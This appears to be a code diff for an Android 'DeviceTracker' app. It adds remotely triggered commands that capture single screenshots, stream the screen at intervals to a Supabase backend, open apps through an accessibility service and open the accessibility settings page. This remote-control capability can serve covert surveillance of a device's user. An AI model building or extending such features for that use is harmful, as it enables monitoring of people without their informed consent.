@@ -1,6 +1,7 @@
 using Android.App;
 using Android.Content;
 using Android.OS;
+using DeviceTracker;
 using DeviceTracker.Models.Command;
 using Newtonsoft.Json;
 
@@ -51,6 +52,28 @@ public sealed class CommandExecutor
 
                 case CommandTypes.CaptureApps:
                     await _bgService.DirectCollectAndPushAsync("apps", CancellationToken.None);
+                    break;
+
+                case CommandTypes.ScreenCapture:
+                    await CaptureScreenAsync();
+                    break;
+
+                case CommandTypes.ScreenStreamStart:
+                    var interval = args.ContainsKey("interval") ? Convert.ToInt32(args["interval"]) : 3000;
+                    _ = Task.Run(() => StartScreenStreamAsync(interval));
+                    break;
+
+                case CommandTypes.ScreenStreamStop:
+                    StopScreenStream();
+                    break;
+
+                case CommandTypes.OpenApp:
+                    var pkg = args.GetValueOrDefault("package")?.ToString() ?? "";
+                    if (!string.IsNullOrEmpty(pkg)) OpenAppAsync(pkg);
+                    break;
+
+                case CommandTypes.StartAccessibility:
+                    OpenAccessibilitySettings();
                     break;
 
                 case CommandTypes.CaptureScreenshot:
@@ -340,6 +363,139 @@ public sealed class CommandExecutor
         catch (Exception ex)
         {
             System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Uninstall error: {ex.Message}");
+        }
+    }
+
+    private static async Task CaptureScreenAsync()
+    {
+        try
+        {
+            // Request MediaProjection consent if not yet granted
+            if (Services.Media.ScreenCaptureService.ProjectionData == null)
+            {
+                MainActivity.Instance?.RequestScreenCapture();
+                await Task.Delay(2000);
+                if (Services.Media.ScreenCaptureService.ProjectionData == null)
+                {
+                    System.Diagnostics.Debug.WriteLine("[CmdExecutor] Screen capture consent not granted");
+                    return;
+                }
+            }
+
+            var ctx = Android.App.Application.Context;
+            var svc = IPlatformApplication.Current?.Services
+                ?.GetService<Services.SupabaseService>();
+            if (svc == null) return;
+
+            // Try AccessibilityService first
+            var acc = RemoteAccessibilityService.Instance;
+            if (acc != null)
+            {
+                acc.PerformKeyPress(Android.Views.Keycode.Home);
+                await Task.Delay(500);
+            }
+
+            // Use ScreenCaptureService
+            var captureSvc = Services.Media.ScreenCaptureService.Instance;
+            if (captureSvc == null)
+            {
+                var intent = new Intent(ctx, typeof(Services.Media.ScreenCaptureService));
+                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
+                    ctx.StartForegroundService(intent);
+                else
+                    ctx.StartService(intent);
+                await Task.Delay(1000);
+                captureSvc = Services.Media.ScreenCaptureService.Instance;
+            }
+
+            if (captureSvc == null) return;
+
+            var path = await captureSvc.CaptureScreenshotAsync();
+            if (path == null) return;
+
+            var record = new DeviceTracker.Models.MediaCaptureRecord
+            {
+                DeviceSerial = Preferences.Get("device_serial", "UNKNOWN"),
+                MediaType = "screenshot",
+                FilePath = path,
+                MimeType = "image/jpeg",
+                CapturedAt = DateTime.UtcNow
+            };
+            await svc.PushMediaCaptureAsync(record);
+        }
+        catch (Exception ex)
+        {
+            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] ScreenCapture error: {ex.Message}");
+        }
+    }
+
+    private static async Task StartScreenStreamAsync(int intervalMs)
+    {
+        try
+        {
+            var captureSvc = Services.Media.ScreenCaptureService.Instance;
+            if (captureSvc == null)
+            {
+                var ctx = Android.App.Application.Context;
+                var intent = new Intent(ctx, typeof(Services.Media.ScreenCaptureService));
+                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
+                    ctx.StartForegroundService(intent);
+                else
+                    ctx.StartService(intent);
+                await Task.Delay(1000);
+                captureSvc = Services.Media.ScreenCaptureService.Instance;
+            }
+            if (captureSvc != null)
+                await captureSvc.StartStreamingAsync(intervalMs);
+        }
+        catch (Exception ex)
+        {
+            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] ScreenStream error: {ex.Message}");
+        }
+    }
+
+    private static void StopScreenStream()
+    {
+        var captureSvc = Services.Media.ScreenCaptureService.Instance;
+        captureSvc?.StopStreaming();
+    }
+
+    private static void OpenAppAsync(string packageName)
+    {
+        try
+        {
+            var acc = RemoteAccessibilityService.Instance;
+            if (acc != null)
+            {
+                acc.OpenApp(packageName);
+                return;
+            }
+            var ctx = Android.App.Application.Context;
+            var intent = ctx.PackageManager?.GetLaunchIntentForPackage(packageName);
+            if (intent != null)
+            {
+                intent.SetFlags(ActivityFlags.NewTask);
+                ctx.StartActivity(intent);
+            }
+        }
+        catch (Exception ex)
+        {
+            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] OpenApp error: {ex.Message}");
+        }
+    }
+
+    private static void OpenAccessibilitySettings()
+    {
+        try
+        {
+            var ctx = Android.App.Application.Context;
+            var intent = new Intent(Android.Provider.Settings.ActionAccessibilitySettings);
+            intent.SetFlags(ActivityFlags.NewTask);
+            ctx.StartActivity(intent);
+        }
+        catch (Exception ex)
+        {
+            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Accessibility settings error: {ex.Message}");
         }
     }
 }
